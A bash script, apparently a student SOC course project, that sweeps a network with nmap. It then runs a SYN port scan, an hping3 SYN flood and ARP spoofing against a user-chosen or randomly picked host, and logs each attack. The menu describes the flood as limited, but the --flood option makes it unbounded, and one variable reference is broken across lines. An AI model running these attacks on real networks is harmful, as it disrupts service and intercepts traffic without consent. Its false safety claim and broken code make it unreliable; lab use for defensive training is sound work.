#!/bin/bash

################################################################################
#                        SOC Analyst Project: CHECKER                            #
#                           Program Code: NX220                                 #
#                                                                              #
# Author: EMMANUEL SHYIRAMBERE                                                      #
# Class Code: RW-University-II.s7                                                       #
# Lecturer: Mr. DOMINIC HARELIMANA                                                   #
#                                                                              #
#                                                                              #
################################################################################
#                                REFERENCES                                     #
################################################################################
#                                                                              #
# 1. Network Scanning Techniques:                                              #
#    - Nmap Network Scanning by Gordon Lyon                                    #
#    - https://nmap.org/book/                                                  #
#    - Used for implementing network discovery and port scanning               #
#                                                                              #
# 2. DoS Attack Simulation:                                                    #
#    - Hping3 Documentation                                                    #
#    - https://www.kali.org/tools/hping3/                                      #
#    - Reference for implementing controlled DoS simulation                    #
#                                                                              #
# 3. ARP Spoofing Implementation:                                             #
#    - Dsniff Documentation                                                    #
#    - https://www.monkey.org/~dugsong/dsniff/                                #
#    - Used for ARP spoofing simulation techniques                            #
#                                                                              #
# 4. Shell Scripting Best Practices:                                          #
#    - Advanced Bash-Scripting Guide by Mendel Cooper                         #
#    - https://tldp.org/LDP/abs/html/                                         #
#    - Used for shell scripting patterns and best practices                   #
#                                                                              #
# 5. UI Components:                                                           #
#    - Loading animation inspired by:                                          #
#      https://github.com/edouard-lopez/progress-bar.sh                       #
#    - Frame drawing adapted from:                                            #
#      https://github.com/barbw1re/bash-menu                                     #
#                                                                              #
# 6. Color Formatting in Bash:                                                #
#    - ANSI/VT100 Control sequences                                           #
#    - https://misc.flogisoft.com/bash/tip_colors_and_formatting             #
#    - Used for implementing color-coded output                               #
#                                                                              #
# 7. Logging Best Practices:                                                  #
#    - The Art of Unix Programming by Eric Raymond                            #
#    - http://www.catb.org/~esr/writings/taoup/                              #
#    - Used for implementing proper logging mechanisms                        #
#                                                                              #
# 8. Security Testing Methodology:                                            #
#    - NIST Special Publication 800-115                                       #
#    - Technical Guide to Information Security Testing and Assessment         #
#    - https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf #
#    - Used for overall security testing approach                             #
#                                                                              #
# 9. Error Handling Patterns:                                                 #
#    - Unix Programming Environment by Kernighan and Pike                     #
#    - Used for implementing robust error handling                            #
#                                                                              #
# 10. Network Security Tools:                                                 #
#     - Security Power Tools by Bryan Burns et al.                           #
#     - O'Reilly Media                                                        #
#     - Used for tool selection and implementation strategy                   #
#                                                                              #
################################################################################

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

# Log file location
LOG_FILE="/var/log/soc_checker.log"

# Function to draw frames
draw_frame() {
    local width=$1
    local title="$2"
    local top_bottom="╔"
    local middle="║"
    
    # Create top border
    for ((i=0; i<width-2; i++)); do
        top_bottom+="═"
    done
    top_bottom+="╗"
    
    # Print top border with title
    echo -e "${CYAN}$top_bottom${NC}"
    if [ ! -z "$title" ]; then
        printf "${CYAN}║${BOLD}%*s%*s${CYAN}║${NC}\n" $(((width-2+${#title})/2)) "$title" $(((width-2-${#title})/2)) ""
        printf "${CYAN}║%*s║${NC}\n" $((width-2)) ""
    fi
}

# Function to draw bottom frame
draw_bottom_frame() {
    local width=$1
    local bottom="╚"
    for ((i=0; i<width-2; i++)); do
        bottom+="═"
    done
    bottom+="╝"
    echo -e "${CYAN}$bottom${NC}"
}

# Loading animation function
show_loading() {
    local message="$1"
    local pid=$2
    local dots=1
    
    while kill -0 $pid 2>/dev/null; do
        printf "\r${YELLOW}$message"
        for ((i=0; i<dots; i++)); do
            printf "."
        done
        for ((i=dots; i<5; i++)); do
            printf " "
        done
        printf "${NC}"
        dots=$((dots + 1))
        if [ $dots -gt 5 ]; then
            dots=1
        fi
        sleep 0.5
    done
    printf "\r%*s\r" $((${#message} + 5)) ""
}

# Function to check if script is run as root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}╔════════════════════════════════════╗"
        echo -e "║  Please run this script as root!     ║"
        echo -e "╚════════════════════════════════════╝${NC}"
        exit 1
    fi
}

# Function to check and install dependencies
check_dependencies() {
    local dependencies=("nmap" "hping3" "dsniff" "ipcalc")
    local missing_deps=()
    
    echo -e "${BLUE}Checking required dependencies...${NC}"
    
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${YELLOW}$dep is not installed.${NC}"
            missing_deps+=("$dep")
        fi
    done
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo -e "${YELLOW}Installing missing dependencies...${NC}"
        if command -v apt &> /dev/null; then
            # For Debian-based systems (Ubuntu, Kali)
            sudo apt update
            sudo apt install -y "${missing_deps[@]}"
        elif command -v pacman &> /dev/null; then
            # For Arch-based systems
            sudo pacman -Sy --noconfirm "${missing_deps[@]}"
        elif command -v dnf &> /dev/null; then
            # For RedHat-based systems (Fedora)
            sudo dnf install -y "${missing_deps[@]}"
        else
            echo -e "${RED}Package manager not supported. Please install manually:${NC}"
            for dep in "${missing_deps[@]}"; do
                echo "- $dep"
            done
            return 1
        fi
    fi
    
    echo -e "${GREEN}All dependencies are installed!${NC}"
    return 0
}

# Function to get current device's IP and network
get_current_network() {
    # Get primary interface (excluding lo)
    local interface=$(ip route | grep default | awk '{print $5}')
    if [ -z "$interface" ]; then
        echo -e "${RED}No active network interface found.${NC}"
        return 1 
    fi
    
    # Get IP and network information
    local ip_info=$(ip -4 addr show $interface | grep inet)
    local ip=$(echo $ip_info | awk '{print $2}' | cut -d/ -f1)
    local cidr=$(echo $ip_info | awk '{print $2}' | cut -d/ -f2)
    local network=$(ipcalc $ip/$cidr | grep Network | awk '{print $2}')
    
    echo "$interface:$ip:$network"
}

# Function to let user choose network range
select_network_range() {
    # Debug output for troubleshooting
    echo -e "${YELLOW}Debug: Getting current network info...${NC}"
    
    local current_network_info=$(get_current_network)
    local get_network_status=$?
    
    # Debug output for network info
    echo -e "${YELLOW}Debug: Network info status: $get_network_status${NC}"
    echo -e "${YELLOW}Debug: Network info: $current_network_info${NC}"
    
    if [ $get_network_status -ne 0 ] || [ -z "$current_network_info" ]; then
        echo -e "${RED}Failed to get network information. Using default options.${NC}"
        # Show menu even if network info fails
        draw_frame 70 "Network Selection"
        echo -e "${BLUE}Select scan range:${NC}"
        echo "1. Custom IP range"
        echo "2. Single IP address"
        draw_bottom_frame 70
        
        read -p "Enter your choice (1-2): " range_choice
        
        case $range_choice in
            1)
                read -p "Enter IP range (e.g., 192.168.1.0/24): " custom_range
                if [[ $custom_range =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
                    echo "$custom_range"
                else
                    echo -e "${RED}Invalid IP range format${NC}"
                    return 1
                fi
                ;;
            2)
                read -p "Enter single IP address: " single_ip
                if [[ $single_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    echo "$single_ip/32"
                else
                    echo -e "${RED}Invalid IP address format${NC}"
                    return 1
                fi
                ;;
            *)
                echo -e "${RED}Invalid choice${NC}"
                return 1
                ;;
        esac
        return
    fi
    
    local interface=$(echo $current_network_info | cut -d: -f1)
    local current_ip=$(echo $current_network_info | cut -d: -f2)
    local network_range=$(echo $current_network_info | cut -d: -f3)
    
    # Debug output for parsed values
    echo -e "${YELLOW}Debug: Interface: $interface${NC}"
    echo -e "${YELLOW}Debug: Current IP: $current_ip${NC}"
    echo -e "${YELLOW}Debug: Network Range: $network_range${NC}"
    
    draw_frame 70 "Network Selection"
    echo -e "${GREEN}Current Network Information:${NC}"
    echo -e "Interface: ${YELLOW}$interface${NC}"
    echo -e "Your IP: ${YELLOW}$current_ip${NC}"
    echo -e "Network Range: ${YELLOW}$network_range${NC}"
    echo
    echo -e "${BLUE}Select scan range:${NC}"
    echo "1. Current network range ($network_range)"
    echo "2. Custom IP range"
    echo "3. Single IP address"
    draw_bottom_frame 70
    
    read -p "Enter your choice (1-3): " range_choice
    
    case $range_choice in
        1)
            echo "$network_range"
            ;;
        2)
            read -p "Enter IP range (e.g., 192.168.1.0/24): " custom_range
            if [[ $custom_range =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
                echo "$custom_range"
            else
                echo -e "${RED}Invalid IP range format${NC}"
                return 1
            fi
            ;;
        3)
            read -p "Enter single IP address: " single_ip
            if [[ $single_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo "$single_ip/32"
            else
                echo -e "${RED}Invalid IP address format${NC}"
                return 1
            fi
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            return 1
            ;;
    esac
}

# Function to check if scan results are empty
check_scan_results() {
    local network_ips="$1"  # Properly quote the parameter
    if [ -z "${network_ips}" ]; then  # Use proper parameter expansion
        echo -e "${YELLOW}No hosts found in the scan. Please wait...${NC}"
        sleep 2
        return 1
    fi
    return 0
}

# Network scanning function
scan_network() {
    echo -e "\n${GREEN}Preparing network scan...${NC}"
    
    local scan_range=$(select_network_range)
    if [ "$?" -ne 0 ]; then
        echo -e "${RED}Failed to determine network range${NC}"
        read -p "Press Enter to continue..."
        return 1
    fi
    
    echo -e "\n${YELLOW}Scanning network range: $scan_range${NC}"
    echo -e "${CYAN}Please wait while scanning...${NC}"
    
    # Start scanning in background and show loading animation
    nmap -sn "$scan_range" > /tmp/nmap_scan &
    local nmap_pid=$!
    show_loading "Scanning network" $nmap_pid
    
    # Wait for nmap to finish and check its exit status
    wait $nmap_pid
    if [ "$?" -ne 0 ]; then
        echo -e "${RED}Network scan failed${NC}"
        read -p "Press Enter to continue..."
        return 1
    fi
    
    # Process scan results with error checking
    local network_ips=""
    if [ -f "/tmp/nmap_scan" ]; then
        network_ips=$(grep "Nmap scan" /tmp/nmap_scan | cut -d " " -f 5)
        rm /tmp/nmap_scan
    fi
    
    # Verify we have results before proceeding
    if [ -z "${network_i
    ps}" ]; then
        echo -e "${YELLOW}No hosts found in scan range: $scan_range${NC}"
        read -p "Press Enter to continue..."
        return 1
    fi
    
    # Display results in a formatted table
    draw_frame 60 "Available Targets"
    echo -e "${BLUE}Found IPs:${NC}"
    local counter=1
    while IFS= read -r ip; do
        echo -e "${GREEN}$counter.${NC} $ip"
        ((counter++))
    done <<< "$network_ips"
    draw_bottom_frame 60
    
    # Store IPs for later use
    echo "$network_ips" > /tmp/available_ips
    return 0
}

# Target selection function
select_target() {
    local available_ips=$(cat /tmp/available_ips 2>/dev/null)
    
    # First show target selection menu
    draw_frame 60 "Target Selection"
    echo -e "${BLUE}Select target:${NC}"
    echo "1. Use your IP ($(get_current_network | cut -d: -f2))"
    echo "2. Choose from available IPs"
    echo "3. Enter custom IP"
    echo "4. Random IP from available"
    draw_bottom_frame 60
    
    read -p "Enter your choice (1-4): " target_choice
    
    case $target_choice in
        1)
            local current_ip=$(get_current_network | cut -d: -f2)
            if [ -n "$current_ip" ]; then
                echo "$current_ip" > /tmp/selected_target
                return 0
            else
                echo -e "${RED}Could not determine current IP${NC}"
                return 1
            fi
            ;;
        2)
            if [ -z "$available_ips" ]; then
                echo -e "${RED}No available IPs. Please run a network scan first${NC}"
                return 1
            fi
            
            # Show available IPs and wait for user input
            draw_frame 60 "Available Targets"
            echo -e "${BLUE}Found IPs:${NC}"
            local counter=1
            while IFS= read -r ip; do
                echo -e "${GREEN}$counter.${NC} $ip"
                ((counter++))
            done <<< "$available_ips"
            draw_bottom_frame 60
            
            local ip_number
            read -p "Enter number from the list above: " ip_number
            
            if [ "$ip_number" -ge 1 ] && [ "$ip_number" -lt "$counter" ]; then
                sed -n "${ip_number}p" /tmp/available_ips > /tmp/selected_target
                return 0
            else
                echo -e "${RED}Invalid selection${NC}"
                return 1
            fi
            ;;
        3)
            read -p "Enter IP address: " custom_ip
            if [[ $custom_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo "$custom_ip" > /tmp/selected_target
                return 0
            else
                echo -e "${RED}Invalid IP format${NC}"
                return 1
            fi
            ;;
        4)
            if [ -z "$available_ips" ]; then
                echo -e "${RED}No available IPs for random selection${NC}"
                return 1
            fi
            echo "$available_ips" | shuf -n 1 > /tmp/selected_target
            return 0
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            return 1
            ;;
    esac
}

# Attack 1: Port Scanning Attack
port_scan_attack() {
    local target=$1
    echo -e "\n${YELLOW}Initiating Port Scanning Attack${NC}"
    # Run scan in background and show loading
    nmap -sS -p- -T4 "$target" > /tmp/scan_results &
    show_loading "Executing port scan on $target" $!
    
    # Process and display results
    echo -e "\n${GREEN}Scan Results:${NC}"
    cat /tmp/scan_results
    rm /tmp/scan_results
    log_attack "Port Scanning" "$target"
}

# Attack 2: DoS Simulation Attack
dos_simulation() {
    local target=$1
    echo -e "\n${YELLOW}Initiating DoS Simulation${NC}"
    # Run DoS simulation in background and show loading
    hping3 -c 10 -d 120 -S -w 64 -p 80 --flood "$target" > /dev/null 2>&1 &
    show_loading "Executing DoS simulation on $target" $!
    log_attack "DoS Simulation" "$target"
}

# Attack 3: ARP Spoofing Simulation
arp_spoof_simulation() {
    local target=$1
    echo -e "\n${YELLOW}Initiating ARP Spoofing Simulation${NC}"
    # Run ARP spoofing in background and show loading
    timeout 10 arpspoof -i eth0 -t "$target" "$(ip route | grep default | awk '{print $3}')" > /dev/null 2>&1 &
    show_loading "Executing ARP spoofing on $target" $!
    log_attack "ARP Spoofing" "$target"
}

# Function to log attacks
log_attack() {
    local attack_type=$1
    local target=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] Attack Type: $attack_type, Target: $target" >> "$LOG_FILE"
}

# Function to display attack descriptions
display_attacks() {
    draw_frame 60 "Available Attacks"
    echo -e "${GREEN}║ 1. Port Scanning Attack${NC}"
    echo -e "${BLUE}   - Comprehensive port scan to identify open services${NC}"
    echo -e "${GREEN}║ 2. DoS Simulation${NC}"
    echo -e "${BLUE}   - Simulated Denial of Service attack (limited packets)${NC}"
    echo -e "${GREEN}║ 3. ARP Spoofing Simulation${NC}"
    echo -e "${BLUE}   - Network layer attack simulation${NC}"
    echo -e "${GREEN}║ 4. Random Attack Selection${NC}"
    echo -e "${BLUE}   - Randomly chooses one of the above attacks${NC}"
    echo -e "${GREEN}║ 5. Exit Program${NC}"
    draw_bottom_frame 60
}

# Main menu function
main_menu() {
    check_root
    
    # Check and install dependencies
    if ! check_dependencies; then
        echo -e "${RED}Failed to install required dependencies.${NC}"
        exit 1
    fi
    
    # Create log file if it doesn't exist
    touch "$LOG_FILE" 2>/dev/null || {
        echo -e "${RED}Cannot create log file. Check permissions.${NC}"
        exit 1
    }
    
    while true; do
        clear
        # Show welcome message and program description
        draw_frame 70 "SOC Team Attack Simulator"
        echo -e "${BLUE}Welcome to the SOC Team Attack Simulator!${NC}"
        echo -e "\nThis tool helps security teams test network defenses by:"
        echo "- Identifying active hosts on the network"
        echo "- Simulating various network attacks"
        echo "- Logging all activities for analysis"
        echo -e "\n${YELLOW}Please select your target range to begin...${NC}"
        
        # Network Scanning Phase
        local scan_range=""
        draw_frame 60 "Network Selection"
        echo -e "${BLUE}Select scan range:${NC}"
        local current_network_info=$(get_current_network)
        if [ $? -eq 0 ]; then
            local network_range=$(echo $current_network_info | cut -d: -f3)
            echo "1. Current network range ($network_range)"
        else
            echo "1. Current network range (Not available)"
        fi
        echo "2. Custom IP range"
        echo "3. Single IP address"
        draw_bottom_frame 60
        
        read -p "Enter your choice (1-3): " range_choice
        
        case $range_choice in
            1)
                if [ -n "$network_range" ]; then
                    scan_range="$network_range"
                else
                    echo -e "${RED}Failed to determine current network range${NC}"
                    read -p "Press Enter to continue..."
                    continue
                fi
                ;;
            2)
                read -p "Enter IP range (e.g., 192.168.1.0/24): " scan_range
                if ! [[ $scan_range =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
                    echo -e "${RED}Invalid IP range format${NC}"
                    read -p "Press Enter to continue..."
                    continue
                fi
                ;;
            3)
                read -p "Enter single IP address: " scan_range
                if ! [[ $scan_range =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    echo -e "${RED}Invalid IP address format${NC}"
                    read -p "Press Enter to continue..."
                    continue
                fi
                scan_range="$scan_range/32"
                ;;
            *)
                echo -e "${RED}Invalid choice${NC}"
                read -p "Press Enter to continue..."
                continue
                ;;
        esac
        
        # Perform network scan
        echo -e "\n${GREEN}Preparing network scan...${NC}"
        echo -e "${YELLOW}Scanning network range: $scan_range${NC}"
        
        nmap -sn "$scan_range" > /tmp/nmap_scan &
        show_loading "Scanning network" $!
        
        # Process scan results
        local network_ips=$(grep "Nmap scan" /tmp/nmap_scan | cut -d " " -f 5)
        rm /tmp/nmap_scan
        
        if [ -z "$network_ips" ]; then
            echo -e "${RED}No hosts found in the specified range${NC}"
            read -p "Press Enter to continue..."
            continue
        fi
        
        # Store IPs for later use
        echo "$network_ips" > /tmp/available_ips
        
        # Display available targets
        draw_frame 60 "Available Targets"
        echo -e "${BLUE}Found IPs:${NC}"
        local counter=1
        while IFS= read -r ip; do
            echo -e "${GREEN}$counter.${NC} $ip"
            ((counter++))
        done <<< "$network_ips"
        draw_bottom_frame 60
        
        # Display attack options
        display_attacks
        
        # Get attack selection
        read -p "Select attack type (1-5): " attack_choice
        
        # Handle exit
        if [ "$attack_choice" -eq 5 ]; then
            echo -e "\n${GREEN}Thank you for using the SOC Team Attack Simulator!${NC}"
            rm -f /tmp/available_ips
            exit 0
        fi
        
        # After attack selection, show target selection menu
        local target_ip=""
		while [ -z "$target_ip" ]; do
			rm -f /tmp/selected_target
			if select_target; then
				target_ip=$(cat /tmp/selected_target 2>/dev/null)
				if [ -z "$target_ip" ]; then
					echo -e "${RED}Error: No target was selected${NC}"
					read -p "Press Enter to continue..."
				fi
			else
				echo -e "${RED}Invalid target selection. Please try again.${NC}"
				read -p "Press Enter to continue..."
			fi
		done
        
        # Execute selected attack with chosen target
        case $attack_choice in
            1) port_scan_attack "$target_ip" ;;
            2) dos_simulation "$target_ip" ;;
            3) arp_spoof_simulation "$target_ip" ;;
            4)
                attack_choice=$((1 + RANDOM % 3))
                echo -e "${YELLOW}Randomly selected attack type $attack_choice${NC}"
                case $attack_choice in
                    1) port_scan_attack "$target_ip" ;;
                    2) dos_simulation "$target_ip" ;;
                    3) arp_spoof_simulation "$target_ip" ;;
                esac
                ;;
        esac
        
        echo -e "\n${GREEN}Attack completed. Check $LOG_FILE for details.${NC}"
        read -p "Press Enter to continue..."
    done
}

# Execute main menu
main_menu
